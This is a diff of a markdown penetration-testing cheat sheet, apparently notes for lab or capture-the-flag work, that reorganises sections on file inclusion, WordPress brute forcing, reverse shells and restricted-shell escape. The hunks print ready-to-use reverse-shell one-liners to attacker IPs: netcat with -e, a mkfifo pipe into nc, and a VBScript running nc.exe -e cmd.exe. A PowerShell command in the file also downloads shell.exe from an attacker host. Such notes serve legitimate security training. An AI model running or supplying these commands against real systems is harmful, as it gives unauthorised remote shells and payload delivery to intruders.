@@ -12,7 +12,9 @@
     * [LFI](#LFI)
     * [RFI](#RFI)
     * [WordPress](#WordPress)
-* LimitShell
+* Reverseshell
+    * [netcat](#netcat)
+* LimitShell escape
     * [rbash](#rbash)
 * Password Crack
     * [john](#john)
@@ -108,26 +110,24 @@ $ python wpforce.py -si admin -w password-file.txt -u host
 ```
 
 ### Reverseshell
-## standard way
+## netcat 
+* standard way
 ```
 $ nc -e /bin/bash 10.10.14.14 4444 
 ```
 ## if parameter -e is not available
 ```
-YOURIP=10.0.0.1
-PORT=4444
+*On Kali machine start listener:
+nc -l 4444
 
-On Kali machine:
-nc -l $PORT
-
-Paste this:
+*Paste this:
 echo "cat /etc/passwd"
 
-Execute this on the target machine:
+*Execute this on the target machine:
 rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 10.0.0.1 4444 1>/tmp/b
 ```
 
-### LimitShell
+### LimitShell escape
 ## rbash
 * edit PATH to escape rbash
 ```
@@ -364,7 +364,7 @@ s&@echo objShell.Exec("nc.exe -e cmd.exe 10.11.0.186 4444")>>poc.vbs&cscript.exe
 ```
 ## powershell download file
 ```
-$ powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP/shell.exe','C:\Users\security\shell.exe')
+$ powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP/shell.exe','C:\Users\username\shell.exe')
 ```
 ### Notes
 ## strck in get user
